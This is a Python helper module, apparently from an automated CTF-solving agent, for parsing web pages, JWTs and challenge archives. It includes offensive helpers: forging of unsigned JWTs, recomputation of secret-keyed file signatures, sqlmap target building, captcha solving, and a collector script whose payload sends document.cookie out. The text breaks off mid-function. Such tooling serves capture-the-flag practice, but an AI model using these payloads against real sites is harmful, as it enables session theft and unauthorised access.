"""Standalone helper functions extracted from ctf_dispatcher.py.

Pure module-level helpers (URL/HTML/JWT/forensics parsing, captcha/PoW solving,
docker-probe script builders) that CTFTaskDispatcher and sibling helpers call as
bare names. Split out to slim ctf_dispatcher.py; re-exported there via
``from .dispatcher_helpers import *``. No dependency on the dispatcher class, so
there is no import cycle.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import struct
import sys
import tempfile
import time
import uuid
import zipfile
from html.parser import HTMLParser
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, quote, quote_plus, urlencode, urljoin, urlparse

try:
    import jwt as _pyjwt  # type: ignore[import-not-found]
except Exception:
    _pyjwt = None


# (moved from ctf_dispatcher)
_SID_RE = re.compile(r"(?:^|[;\s])sid=([^;\s&]+)", re.IGNORECASE)

# (moved from ctf_dispatcher)
_SESSION_COOKIE_RE = re.compile(
    r"(?:^|[;\s])((?:sid|sessionid|phpsessid|jsessionid)=([^;\s&]+))",
    re.IGNORECASE,
)

# (moved from ctf_dispatcher)
_FIELD_NAME_HINTS = {
    "username": ("user", "name", "email", "login"),
    "password": ("pass", "pwd"),
}

# (moved from ctf_dispatcher)
_FAILURE_TEXT_HINTS = (
    "wrong username password",
    "invalid credentials",
    "login failed",
    "incorrect",
    "denied",
    "forbidden",
    "失败",
    "错误",
    "臭弟弟",
)

# (moved from ctf_dispatcher)
_RECON_TOOL_HINTS = {
    "playwright not installed": "browser",
    "httpx not installed": "http_request",
}

# (moved from ctf_dispatcher)
_CONTACT_CAPTCHA_IMAGE_RE = re.compile(r"/captcha/image/([^/]+)/", re.IGNORECASE)

# (moved from ctf_dispatcher)
_ADMIN_PASSWORD_LOG_RE = re.compile(r"Admin password set to:\s*([^\s]+)")

# (moved from ctf_dispatcher)
_JWT_ALG_HASH = {
    "HS256": hashlib.sha256,
    "HS512": hashlib.sha512,
}


def _normalize_target(target: str) -> str:
    text = str(target or "").strip()
    if not text:
        return text
    if text.startswith("http://") or text.startswith("https://"):
        return text.rstrip("/")
    return f"http://{text.rstrip('/')}"


def _base_target(target: str) -> str:
    parsed = urlparse(_normalize_target(target))
    if parsed.scheme and parsed.netloc:
        return f"{parsed.scheme}://{parsed.netloc}"
    return _normalize_target(target)


def _normalize_exploration_url(url: str) -> str:
    """Canonicalize discovered URLs for stable exploration state.

    In particular, normalize root-query URLs like:
    - http://host?file=flag.php
    into:
    - http://host/?file=flag.php
    """
    text = str(url or "").strip()
    if not text:
        return ""
    parsed = urlparse(text)
    if parsed.scheme in {"http", "https"} and parsed.netloc and parsed.path == "" and parsed.query:
        return parsed._replace(path="/").geturl()
    return text


def _join_relative_url(base_url: str, candidate: str) -> str:
    base = str(base_url or "").strip()
    rel = str(candidate or "").strip()
    if not base:
        return rel
    if not rel:
        return base
    if re.match(r"^[a-zA-Z][a-zA-Z0-9+\-.]*://", rel) or rel.startswith("//"):
        return urljoin(base, rel)
    if rel.startswith("?"):
        return urljoin(_base_target(base) + "/", rel)
    base_for_join = base if (base.endswith("/") or rel.startswith("/")) else base + "/"
    return urljoin(base_for_join, rel)


def _is_stuck_trajectory(state: "CTFState") -> bool:
    """Phase 7: online stuck-trajectory detector.

    Returns True if the last 6 observations contain ≥ 3 entries that share
    both `kind` and (truncated) `value`, which signals the agent is repeating
    the same ineffective action rather than exploring new paths.

    Only considers web/xss chain observations (kind starting with "recon",
    "http_response", "uniform_failure", "strategy_surface").
    """
    if state is None:
        return False
    recent = list(state.observations)[-6:]
    if len(recent) < 3:
        return False
    _WATCHED_KINDS = {"recon_url", "http_response", "uniform_failure_surface", "strategy_surface_exhausted"}
    counts: dict[str, int] = {}
    for obs in recent:
        if obs.kind not in _WATCHED_KINDS:
            continue
        key = f"{obs.kind}::{str(obs.value or '')[:80]}"
        counts[key] = counts.get(key, 0) + 1
        if counts[key] >= 3:
            return True
    return False


def _discover_hash_params(text: str) -> dict[str, str]:
    """Phase 7 §7 (SignSaboteur): 从 URL 或页面文本中提取 filename/filehash 类参数对。

    返回 {'filename': '...', 'filehash': '...'}；未找到时返回空 dict。
    支持的参数名：filename/name/file → filehash/hash/sign/token/sig/checksum。
    """
    from urllib.parse import parse_qs, urlparse  # noqa: PLC0415

    blob = str(text or "")
    file_keys = ("filename", "name", "file")
    hash_keys = ("filehash", "hash", "sign", "token", "sig", "checksum")

    # 先尝试解析为 URL query string
    try:
        parsed = urlparse(blob if "://" in blob else f"http://x/?{blob}")
        qs = parse_qs(parsed.query, keep_blank_values=True)
        fname_val = next(
            (qs[k][0] for k in file_keys if k in qs and qs[k]), None
        )
        hash_val = next(
            (qs[k][0] for k in hash_keys if k in qs and qs[k]), None
        )
        if fname_val and hash_val:
            return {"filename": fname_val, "filehash": hash_val}
    except Exception:
        pass

    # 再尝试正则扫描自由文本
    import re  # noqa: PLC0415
    fname_match = re.search(
        r"(?:filename|name|file)=([^\s&\"']+)", blob, re.IGNORECASE
    )
    hash_match = re.search(
        r"(?:filehash|hash|sign|token|sig|checksum)=([0-9a-fA-F]{32,64})", blob, re.IGNORECASE
    )
    if fname_match and hash_match:
        return {"filename": fname_match.group(1), "filehash": hash_match.group(1)}

    return {}


def _infer_hash_format(hash_value: str) -> str:
    """Phase 7 §7 (SignSaboteur): 根据哈希长度和字符集推断格式。

    返回 "md5"（32 位 hex）/ "sha256"（64 位 hex）/ "jwt"（eyJ...）
    / "unknown"。
    """
    h = str(hash_value or "").strip().lower()
    if not h:
        return "unknown"
    if h.startswith("eyj") and h.count(".") >= 2:
        return "jwt"
    hex_chars = set("0123456789abcdef")
    if not all(c in hex_chars for c in h):
        return "unknown"
    if len(h) == 32:
        return "md5"
    if len(h) == 64:
        return "sha256"
    return "unknown"


def _b64url_encode_bytes(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64url_decode_text(text: str) -> bytes:
    normalized = str(text or "").strip()
    padding = "=" * (-len(normalized) % 4)
    return base64.urlsafe_b64decode((normalized + padding).encode("ascii"))


def _jwt_encode(payload: dict[str, Any], secret: str, algorithm: str) -> str:
    normalized_algorithm = str(algorithm or "").upper()
    if _pyjwt is not None:
        token = _pyjwt.encode(
            payload,
            key=secret,
            algorithm="none" if normalized_algorithm == "NONE" else normalized_algorithm,
            headers={"alg": "none", "typ": "JWT"} if normalized_algorithm == "NONE" else None,
        )
        return str(token)

    header = {
        "alg": "none" if normalized_algorithm == "NONE" else normalized_algorithm,
        "typ": "JWT",
    }
    header_segment = _b64url_encode_bytes(
        json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    )
    payload_segment = _b64url_encode_bytes(
        json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    )
    signing_input = f"{header_segment}.{payload_segment}".encode("ascii")
    if normalized_algorithm == "NONE":
        signature_segment = ""
    else:
        digest = _JWT_ALG_HASH.get(normalized_algorithm)
        if digest is None:
            raise ValueError(f"unsupported jwt algorithm: {algorithm}")
        signature = hmac.new(str(secret or "").encode("utf-8"), signing_input, digest).digest()
        signature_segment = _b64url_encode_bytes(signature)
    return f"{header_segment}.{payload_segment}.{signature_segment}"


def _jwt_get_unverified_header(token: str) -> dict[str, Any]:
    normalized = str(token or "").strip()
    if _pyjwt is not None:
        return dict(_pyjwt.get_unverified_header(normalized))
    parts = normalized.split(".")
    if len(parts) < 2:
        raise ValueError("invalid jwt token")
    return dict(json.loads(_b64url_decode_text(parts[0]).decode("utf-8")))


def _jwt_decode_payload(token: str) -> dict[str, Any]:
    normalized = str(token or "").strip()
    if _pyjwt is not None:
        payload = _pyjwt.decode(
            normalized,
            options={"verify_signature": False, "verify_exp": False},
            algorithms=["HS256", "HS384", "HS512", "RS256", "none"],
        )
        return dict(payload)
    parts = normalized.split(".")
    if len(parts) < 2:
        raise ValueError("invalid jwt token")
    return dict(json.loads(_b64url_decode_text(parts[1]).decode("utf-8")))


def _jwt_decode_verified(token: str, secret: str, algorithms: list[str]) -> dict[str, Any]:
    normalized = str(token or "").strip()
    normalized_algs = [str(item or "").upper() for item in list(algorithms or []) if str(item or "").strip()]
    if _pyjwt is not None:
        payload = _pyjwt.decode(
            normalized,
            secret,
            algorithms=normalized_algs,
            options={"verify_exp": False},
        )
        return dict(payload)
    parts = normalized.split(".")
    if len(parts) != 3:
        raise ValueError("invalid jwt token")
    header = _jwt_get_unverified_header(normalized)
    alg = str(header.get("alg") or "").upper()
    if alg not in normalized_algs:
        raise ValueError("algorithm not allowed")
    if alg == "NONE":
        return _jwt_decode_payload(normalized)
    digest = _JWT_ALG_HASH.get(alg)
    if digest is None:
        raise ValueError(f"unsupported jwt algorithm: {alg}")
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    expected = hmac.new(str(secret or "").encode("utf-8"), signing_input, digest).digest()
    actual = _b64url_decode_text(parts[2])
    if not hmac.compare_digest(expected, actual):
        raise ValueError("signature verification failed")
    return _jwt_decode_payload(normalized)


def _compute_signed_hash(secret: str, filename: str, fmt: str) -> str | None:
    """Phase 7 §7 / Phase 8: 计算 md5 / sha256 / JWT HS256 / HS512 签名。

    Tornado 模式：md5(secret + md5(filename))
    SHA-256 模式：sha256(secret + sha256(filename))
    JWT 模式：对 ``{"filename": <filename>}`` 进行 HS256/HS512 签名。
    返回计算结果的 hex/JWT 字符串；不支持的格式返回 None。
    """
    if fmt == "md5":
        inner = hashlib.md5(filename.encode()).hexdigest()
        return hashlib.md5((secret + inner).encode()).hexdigest()
    if fmt == "sha256":
        inner = hashlib.sha256(filename.encode()).hexdigest()
        return hashlib.sha256((secret + inner).encode()).hexdigest()
    if fmt in {"jwt", "jwt_hs256"}:
        return _jwt_encode({"filename": filename}, secret, "HS256")
    if fmt == "jwt_hs512":
        return _jwt_encode({"filename": filename}, secret, "HS512")
    return None


def _guess_local_ip() -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        sock.close()


def _collector_public_host_for_target(target_base: str) -> str:
    host = str(urlparse(str(target_base or "")).hostname or "").strip().lower()
    if host in {"127.0.0.1", "localhost", "::1"}:
        return "host.docker.internal"
    return _guess_local_ip()


def _is_loopback_base(target_base: str) -> bool:
    host = str(urlparse(str(target_base or "")).hostname or "").strip().lower()
    return host in {"127.0.0.1", "localhost", "::1"}


def _target_port(target_base: str) -> int:
    parsed = urlparse(str(target_base or ""))
    if parsed.port:
        return int(parsed.port)
    if parsed.scheme == "https":
        return 443
    return 80


def _command_output_text(result: Any) -> str:
    return "\n".join(
        part
        for part in (
            str(getattr(result, "stdout", "") or ""),
            str(getattr(result, "stderr", "") or ""),
        )
        if part
    ).strip()


def _extract_sid_from_collector_log(text: str) -> str | None:
    for raw_line in str(text or "").splitlines():
        line = str(raw_line or "").strip()
        if not line:
            continue
        if sid := _extract_sid_from_text(line):
            return sid
    return _extract_sid_from_text(str(text or ""))


def _docker_loopback_probe_script(*, collector_port: int, log_path: str) -> str:
    html = (
        '<!doctype html><meta charset="utf-8">'
        '<script>fetch("/c?sid="+encodeURIComponent(document.cookie)).catch(()=>{});</script>'
    )
    return "\n".join(
        [
            'const fs = require("fs");',
            'const http = require("http");',
            f'const logPath = {json.dumps(log_path)};',
            f'const html = {json.dumps(html)};',
            'fs.writeFileSync(logPath, "");',
            "http.createServer((req, res) => {",
            '  fs.appendFileSync(logPath, req.url + "\\n");',
            '  if (req.url.startsWith("/c")) {',
            "    res.writeHead(204);",
            "    return res.end();",
            "  }",
            '  res.writeHead(200, {"Content-Type": "text/html; charset=utf-8"});',
            "  res.end(html);",
            f'}}).listen({int(collector_port)}, "127.0.0.1");',
            "setInterval(() => {}, 1 << 30);",
        ]
    )


def _docker_loopback_probe_copy_command(*, host_probe_path: Path, container_name: str) -> str:
    return f'docker cp "{str(host_probe_path)}" {container_name}:/tmp/flaghunter_visit_collector.js'


def _docker_loopback_probe_start_command(*, container_name: str) -> str:
    return (
        f'docker exec {container_name} sh -lc "'
        'rm -f /tmp/flaghunter_visit_collector.log /tmp/flaghunter_visit_collector.pid; '
        'nohup node /tmp/flaghunter_visit_collector.js >/tmp/flaghunter_visit_collector.stdout 2>&1 & '
        'echo $! >/tmp/flaghunter_visit_collector.pid"'
    )


def _docker_loopback_probe_read_command(*, container_name: str, log_path: str) -> str:
    return f'docker exec {container_name} sh -lc "cat {log_path} 2>/dev/null"'


def _docker_loopback_probe_cleanup_command(*, container_name: str, log_path: str) -> str:
    return (
        f'docker exec {container_name} sh -lc "'
        'if [ -f /tmp/flaghunter_visit_collector.pid ]; then '
        'kill $(cat /tmp/flaghunter_visit_collector.pid) >/dev/null 2>&1 || true; '
        'rm -f /tmp/flaghunter_visit_collector.pid; '
        'fi; '
        f'rm -f {log_path} /tmp/flaghunter_visit_collector.stdout"'
    )


def _pick_form_field(form: dict[str, Any], field_type: str) -> str | None:
    hints = _FIELD_NAME_HINTS.get(field_type, ())
    for inp in form.get("inputs") or []:
        if not isinstance(inp, dict):
            continue
        name = str(inp.get("name") or "").strip()
        lowered = name.lower()
        if any(hint in lowered for hint in hints):
            return name
    return None


def _extract_local_ctf_assets_from_hint(hint: str) -> dict[str, Any]:
    text = str(hint or "")
    marker = "[local_ctf_assets]"
    if marker not in text:
        return {"challengePath": None, "artifactPaths": []}

    _, _, tail = text.partition(marker)
    challenge_path: str | None = None
    artifact_paths: list[str] = []

    for raw_line in tail.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if line.startswith("[") and line.endswith("]"):
            break
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        value = value.strip().strip("\"'")
        if key == "challengePath":
            challenge_path = value or None
        elif key == "artifactPaths":
            artifact_paths.extend(
                part.strip().strip("\"'")
                for part in value.split(";")
                if part.strip().strip("\"'")
            )

    return {
        "challengePath": challenge_path,
        "artifactPaths": list(dict.fromkeys(artifact_paths)),
    }


def _normalize_local_ctf_asset_context(challenge_context: dict[str, Any] | None) -> dict[str, Any]:
    context = challenge_context if isinstance(challenge_context, dict) else {}
    challenge_path = str(context.get("challengePath") or "").strip() or None
    artifact_paths: list[str] = []
    for raw in context.get("artifactPaths") or []:
        value = str(raw or "").strip()
        if value:
            artifact_paths.append(value)
    return {
        "challengePath": challenge_path,
        "artifactPaths": list(dict.fromkeys(artifact_paths)),
    }


def _extract_local_challenge_root(hint: str, challenge_context: dict[str, Any] | None = None) -> Path | None:
    assets = _normalize_local_ctf_asset_context(challenge_context)
    text = str(hint or "").strip()
    candidates: list[str] = []

    challenge_path = str(assets.get("challengePath") or "").strip()
    if challenge_path:
        candidates.append(challenge_path)
    for artifact_path in assets.get("artifactPaths") or []:
        stripped = str(artifact_path or "").strip()
        if stripped:
            candidates.append(stripped)

    if text:
        hint_assets = _extract_local_ctf_assets_from_hint(text)
        hint_challenge_path = str(hint_assets.get("challengePath") or "").strip()
        if hint_challenge_path:
            candidates.append(hint_challenge_path)
        for artifact_path in hint_assets.get("artifactPaths") or []:
            stripped = str(artifact_path or "").strip()
            if stripped:
                candidates.append(stripped)
        for chunk in [text, *text.splitlines()]:
            stripped = chunk.strip().strip("\"'")
            if stripped:
                candidates.append(stripped)
            windows_match = re.search(r"([A-Za-z]:\\[^\r\n]+)", chunk)
            if windows_match:
                candidates.append(windows_match.group(1).strip().strip("\"'"))

    for candidate in dict.fromkeys(candidates):
        path = Path(candidate)
        if path.is_file():
            if path.name.lower() in {"docker-compose.yml", "docker-compose.yaml"}:
                return path.parent
            if extracted_root := _extract_local_challenge_root_from_local_archive(path):
                return extracted_root
            continue
        if path.is_dir():
            return path
    return None


def _extract_local_challenge_root_from_hint(hint: str) -> Path | None:
    return _extract_local_challenge_root(hint, None)


def _extract_local_challenge_root_from_local_archive(path: Path) -> Path | None:
    lowered = path.name.lower()
    if not lowered.endswith(".zip"):
        return None
    try:
        extract_root = Path(tempfile.mkdtemp(prefix="flaghunter_ctf_zip_"))
        with zipfile.ZipFile(path) as zf:
            for member in zf.infolist():
                member_name = str(member.filename or "")
                if not member_name or member_name.startswith("/") or ".." in Path(member_name).parts:
                    continue
                zf.extract(member, path=extract_root)
        for name in ("docker-compose.yml", "docker-compose.yaml"):
            compose_files = list(extract_root.rglob(name))
            if compose_files:
                return compose_files[0].parent
    except Exception:
        return None
    return None


def _resolve_auth_login_url(
    *,
    target: str,
    auth_form: dict[str, Any],
    endpoints: set[str],
) -> str:
    base = _base_target(target)
    action_url = str(auth_form.get("action") or "").strip()
    method = str(auth_form.get("method") or "").strip().upper()
    parsed_action = urlparse(action_url) if action_url else None
    action_path = str(parsed_action.path or "").strip() if parsed_action else ""
    should_prefer_login_endpoint = (
        "/login" in endpoints
        and (
            not action_url
            or method != "POST"
            or action_path in {"", "/"}
        )
    )
    if should_prefer_login_endpoint:
        return urljoin(base + "/", "login")
    return action_url or urljoin(base + "/", "login")


def _resolve_compose_file(challenge_root: Path | None) -> Path | None:
    if challenge_root is None:
        return None
    for name in ("docker-compose.yml", "docker-compose.yaml"):
        candidate = challenge_root / name
        if candidate.exists():
            return candidate
    return None


def _iter_local_challenge_key_files(challenge_root: Path | None) -> list[Path]:
    if challenge_root is None:
        return []
    files: list[Path] = []
    for name in ("README.md", "package.json", "requirements.txt", "app.py", "index.php"):
        candidate = challenge_root / name
        if candidate.exists() and candidate.is_file():
            files.append(candidate)
    return files


def _build_local_challenge_root_summary_metadata(challenge_root: Path | None) -> dict[str, Any]:
    root = Path(challenge_root) if challenge_root is not None else None
    if root is None or not root.exists() or not root.is_dir():
        return {
            "root_name": "",
            "has_compose": False,
            "key_files": [],
            "detected_stack": [],
            "file_count": 0,
        }
    key_files = [item.name for item in _iter_local_challenge_key_files(root)]
    detected_stack: list[str] = []
    key_file_set = set(key_files)
    if "package.json" in key_file_set:
        detected_stack.append("node")
    if "requirements.txt" in key_file_set or "app.py" in key_file_set:
        detected_stack.append("python")
    if "index.php" in key_file_set:
        detected_stack.append("php")
    try:
        file_count = sum(1 for item in root.rglob("*") if item.is_file())
    except Exception:
        file_count = 0
    return {
        "root_name": root.name,
        "has_compose": _resolve_compose_file(root) is not None,
        "key_files": sorted(key_files),
        "detected_stack": detected_stack,
        "file_count": file_count,
    }


def _docker_compose_logs_command(compose_file: Path) -> str:
    return f'docker compose -f "{compose_file}" logs --no-color --tail 200'


def _extract_admin_password_from_logs(text: str) -> str | None:
    match = _ADMIN_PASSWORD_LOG_RE.search(str(text or ""))
    if not match:
        return None
    password = match.group(1).strip()
    return password or None


def _extract_sid_from_login_response(response: dict[str, Any] | None) -> str | None:
    response = response or {}
    headers = response.get("headers")
    if isinstance(headers, dict):
        set_cookie = str(headers.get("set-cookie") or headers.get("Set-Cookie") or "")
        if session_cookie := _extract_session_cookie_from_text(set_cookie):
            return session_cookie
    body = response.get("body")
    if isinstance(body, dict):
        for key in ("sid", "sessionid", "phpsessid", "jsessionid"):
            sid = body.get(key)
            if sid:
                return str(sid).strip()
    body_text = str(body or "").strip()
    if not body_text:
        return None
    if session_cookie := _extract_session_cookie_from_text(body_text):
        return session_cookie
    try:
        decoded = json.loads(body_text)
    except Exception:
        return None
    if isinstance(decoded, dict):
        for key in ("sid", "sessionid", "phpsessid", "jsessionid"):
            sid = decoded.get(key)
            if sid:
                return str(sid).strip()
    return None


def _extract_sid_from_text(text: str) -> str | None:
    text = str(text or "")
    parsed = urlparse(text)
    if parsed.query:
        for values in parse_qs(parsed.query).values():
            for value in values:
                match = _SID_RE.search(value)
                if match:
                    return match.group(1)
        sid_param = parse_qs(parsed.query).get("sid")
        if sid_param:
            raw = sid_param[0]
            if raw.startswith("sid="):
                match = _SID_RE.search(raw)
                return match.group(1) if match else raw.removeprefix("sid=")
            return raw
    match = _SID_RE.search(text)
    if match:
        return match.group(1)
    return None


def _extract_session_cookie_from_text(text: str) -> str | None:
    text = str(text or "")
    parsed = urlparse(text)
    if parsed.query:
        for values in parse_qs(parsed.query).values():
            for value in values:
                match = _SESSION_COOKIE_RE.search(value)
                if match:
                    return match.group(1)
    match = _SESSION_COOKIE_RE.search(text)
    if match:
        return match.group(1)
    if sid := _extract_sid_from_text(text):
        return f"sid={sid}"
    return None


def _quote_sql_identifier(name: str) -> str:
    identifier = str(name or "").strip()
    return f"`{identifier.replace('`', '``')}`"


def _with_query(url: str, fields: dict[str, str]) -> str:
    query = urlencode(fields, doseq=True)
    if "?" in url:
        separator = "&" if not url.endswith("?") and not url.endswith("&") else ""
        return f"{url}{separator}{query}"
    return f"{url}?{query}"


def _looks_like_successful_auth_change(
    response: dict[str, Any] | None,
    baseline_response: dict[str, Any] | None,
) -> bool:
    response = response or {}
    baseline_response = baseline_response or {}

    body_lower = str(response.get("body") or "").lower()
    baseline_lower = str(baseline_response.get("body") or "").lower()
    if not body_lower:
        return False

    if any(marker in body_lower for marker in _FAILURE_TEXT_HINTS):
        return False

    success_markers = (
        "success",
        "welcome",
        "admin",
        "flag{",
        "ctf{",
        "profile.php",
        "logout",
        "dashboard",
    )
    if any(marker in body_lower for marker in success_markers):
        return True

    final_url = str(response.get("final_url") or "").lower()
    baseline_final_url = str(baseline_response.get("final_url") or "").lower()
    success_paths = ("/profile", "/admin", "/dashboard", "/home", "/update")
    if final_url and final_url != baseline_final_url:
        if any(path in final_url for path in success_paths):
            return True

    redirect_history = list(response.get("redirect_history") or [])
    for item in redirect_history:
        if not isinstance(item, dict):
            continue
        location = str(item.get("location") or item.get("url") or "").lower()
        if location and any(path in location for path in success_paths):
            return True

    headers = response.get("headers") or {}
    baseline_headers = baseline_response.get("headers") or {}
    if isinstance(headers, dict) and isinstance(baseline_headers, dict):
        set_cookie = str(headers.get("set-cookie") or headers.get("Set-Cookie") or "")
        baseline_set_cookie = str(
            baseline_headers.get("set-cookie")
            or baseline_headers.get("Set-Cookie")
            or ""
        )
        if set_cookie and set_cookie != baseline_set_cookie:
            return True

    return False


def _build_sqlmap_target_from_form(
    target: str,
    form: dict[str, Any],
) -> tuple[str, str]:
    action = str(form.get("action") or "").strip()
    if not action:
        action = target
    action_url = urljoin(target if target.endswith("/") else target + "/", action)
    method = str(form.get("method") or "GET").upper()

    fields: dict[str, str] = {}
    for inp in form.get("inputs") or []:
        if not isinstance(inp, dict):
            continue
        name = str(inp.get("name") or "").strip()
        if not name:
            continue
        field_type = str(inp.get("type") or "text").lower()
        if field_type in {"submit", "button", "image", "reset"}:
            continue
        if "pass" in name.lower():
            fields[name] = "test"
        else:
            fields[name] = "test"

    if method == "GET":
        return _with_query(action_url, fields), ""
    return action_url, urlencode(fields, doseq=True)


def _collect_recon_error(
    features: dict[str, Any],
    response: dict[str, Any] | None,
    label: str,
) -> None:
    if not isinstance(response, dict):
        return
    error = str(response.get("error") or "").strip()
    if not error:
        return
    features.setdefault("recon_errors", []).append(f"{label}: {error}")
    missing = features.setdefault("recon_missing_tools", [])
    for name in _infer_missing_tools_from_error(error):
        if name not in missing:
            missing.append(name)


def _infer_missing_tools_from_error(error: str) -> list[str]:
    lowered = str(error or "").lower()
    matched: list[str] = []
    for marker, tool_name in _RECON_TOOL_HINTS.items():
        if marker in lowered and tool_name not in matched:
            matched.append(tool_name)
    return matched


class _FormHTMLParser(HTMLParser):
    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url
        self.forms: list[dict[str, Any]] = []
        self._current_form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_map = {key.lower(): (value or "") for key, value in attrs}
        lowered_tag = tag.lower()
        if lowered_tag == "form":
            action = attr_map.get("action", "").strip()
            method = attr_map.get("method", "get").strip() or "get"
            if action:
                action = urljoin(self.base_url, action)
            else:
                action = self.base_url
            self._current_form = {
                "action": action,
                "method": method,
                "inputs": [],
            }
            self.forms.append(self._current_form)
            return

        if lowered_tag not in {"input", "textarea", "select"} or self._current_form is None:
            return

        name = attr_map.get("name", "").strip()
        if not name:
            return
        input_type = attr_map.get("type", "text").strip() or "text"
        self._current_form.setdefault("inputs", []).append(
            {"name": name, "type": input_type, "value": attr_map.get("value", "")}
        )

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form":
            self._current_form = None


def _parse_forms_from_html(html: str, base_url: str) -> list[dict[str, Any]]:
    parser = _FormHTMLParser(base_url)
    try:
        parser.feed(str(html or ""))
    except Exception:
        return []
    return parser.forms


def _extract_title_from_html(html: str) -> str:
    match = re.search(r"(?is)<title[^>]*>(.*?)</title>", str(html or ""))
    if not match:
        return ""
    return re.sub(r"\s+", " ", match.group(1)).strip()


def _strip_html_text(html: str) -> str:
    text = re.sub(r"(?is)<script.*?>.*?</script>", " ", str(html or ""))
    text = re.sub(r"(?is)<style.*?>.*?</style>", " ", text)
    text = re.sub(r"(?s)<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text).strip()


def _looks_like_archive_path(path: str, body: str = "") -> bool:
    lowered = str(path or "").lower()
    if lowered.endswith((".zip", ".tar.gz", ".tgz", ".tar", ".gz")):
        return True
    return str(body or "").startswith("PK")


def _looks_like_backup_source_candidate(
    path: str,
    body: str,
    headers: Any | None = None,
) -> bool:
    lowered_path = str(path or "").lower()
    text = str(body or "")
    stripped = text.lstrip()
    lowered_body = text.lower()
    header_map = headers if isinstance(headers, dict) else {}
    content_type = str(
        header_map.get("content-type")
        or header_map.get("Content-Type")
        or ""
    ).lower()

    if lowered_path.endswith((".zip", ".tar.gz", ".tgz", ".tar", ".gz")):
        return (
            stripped.startswith("PK")
            or "\x00" in text[:256]
            or any(token in content_type for token in ("zip", "gzip", "tar", "octet-stream"))
        )

    if lowered_path.endswith("/.git/head") or lowered_path.endswith(".git/head"):
        return stripped.startswith("ref: ")

    if _looks_like_python_source_leak(lowered_path, text):
        return True

    if any(lowered_path.endswith(suffix) for suffix in (".phps", ".php", ".bak", "~", ".txt", ".inc")):
        source_markers = (
            "<?php",
            "<?=",
            "show_source",
            "highlight_file",
            "include(",
            "require(",
            "file_get_contents",
            "unserialize(",
            "flag{",
            "dasctf{",
        )
        if any(marker in lowered_body for marker in source_markers):
            return True
        if re.search(r"(?m)^\s*(?:function|class)\s+[A-Za-z_]\w*", text):
            return True
        if "<html" in lowered_body and not any(marker in lowered_body for marker in source_markers):
            return False
        return bool(stripped and "login / register" not in lowered_body and "store your url" not in lowered_body)

    if "<html" in lowered_body and "login / register" in lowered_body:
        return False
    return True


def _looks_like_inline_source_leak(body: str) -> bool:
    raw = str(body or "")
    if not raw.strip():
        return False
    lowered = raw.lower()
    strong_markers = (
        "<?php",
        "&lt;?php",
        "highlight_file",
        "show_source",
        "$_get[",
        "$_post[",
        "$_request[",
        "$_server[",
        "shell_exec(",
        "file_put_contents(",
        "unserialize(",
    )
    if any(marker in lowered for marker in strong_markers):
        return True

    text = _strip_html_text(raw).lower()
    has_superglobal = any(marker in text for marker in ("$_get[", "$_post[", "$_request[", "$_server["))
    has_sink = any(marker in text for marker in ("shell_exec(", "file_put_contents(", "include(", "require(", "unserialize("))
    return has_superglobal and has_sink


def _looks_like_python_source_leak(path: str, body: str = "") -> bool:
    lowered_path = str(path or "").lower()
    if not lowered_path.endswith(".py"):
        return False

    text = str(body or "")
    lowered_body = text.lower()
    strong_markers = (
        "from django",
        "django.shortcuts",
        "django.http",
        "urlpatterns",
        "csrf_exempt",
        "render(",
        "httpresponse",
        "request.session",
    )
    if any(marker in lowered_body for marker in strong_markers):
        return True

    has_python_structure = bool(re.search(r"(?m)^\s*(def|class)\s+[A-Za-z_]\w*", text))
    has_import = bool(re.search(r"(?m)^\s*(from|import)\s+[A-Za-z_][\w.]*", text))
    return has_python_structure and has_import


_CONTACT_OCR_READER: Any | None = None


def _get_contact_ocr_reader():
    global _CONTACT_OCR_READER
    if _CONTACT_OCR_READER is False:
        return None
    if _CONTACT_OCR_READER is not None:
        return _CONTACT_OCR_READER
    try:
        import easyocr
    except Exception:
        _CONTACT_OCR_READER = False
        return None
    try:
        _CONTACT_OCR_READER = easyocr.Reader(["en"], gpu=False, verbose=False)
        return _CONTACT_OCR_READER
    except Exception:
        _CONTACT_OCR_READER = False
        return None


def _normalize_contact_captcha_text(text: str) -> str:
    lowered = str(text or "").strip()
    lowered = lowered.replace("×", "x").replace("X", "x")
    lowered = lowered.replace("＝", "=").replace("？", "?")
    lowered = lowered.replace(" ", "")
    lowered = re.sub(r"[^0-9+\-*/x=]", "", lowered)
    return lowered


def _score_contact_captcha_candidate(text: str, confidence: float) -> tuple[float, int | None]:
    normalized = _normalize_contact_captcha_text(text)
    match = re.fullmatch(r"(\d{1,3})([+\-*/x])(\d{1,3})(=?)(?:\?)?", normalized)
    if not match:
        return confidence, None

    left, op, right, has_equal = match.groups()
    score = confidence + 0.5
    if len(left) == 1 and len(right) == 1:
        score += 0.7
    if has_equal:
        score += 0.2

    try:
        lhs = int(left)
        rhs = int(right)
        if op == "+":
            value = lhs + rhs
        elif op == "-":
            value = lhs - rhs
        elif op in {"x", "*"}:
            value = lhs * rhs
        else:
            if rhs == 0:
                return score, None
            value = lhs // rhs
    except Exception:
        return score, None

    if 0 <= value <= 9999:
        return score, value
    return score, None


async def _solve_contact_captcha_solution(
    runtime,
    contact_html: str,
    contact_url: str,
) -> int | None:
    image_match = _CONTACT_CAPTCHA_IMAGE_RE.search(str(contact_html or ""))
    if not image_match:
        return None

    captcha_image_url = urljoin(contact_url if contact_url.endswith("/") else contact_url + "/", f"/captcha/image/{image_match.group(1)}/")
    try:
        resp = await runtime.proxy_action("get", url=captcha_image_url, timeout=12, binary=True)
    except Exception:
        return None
    if not isinstance(resp, dict) or resp.get("error"):
        return None

    body_base64 = str(resp.get("body_base64") or "")
    if not body_base64:
        return None

    try:
        import io
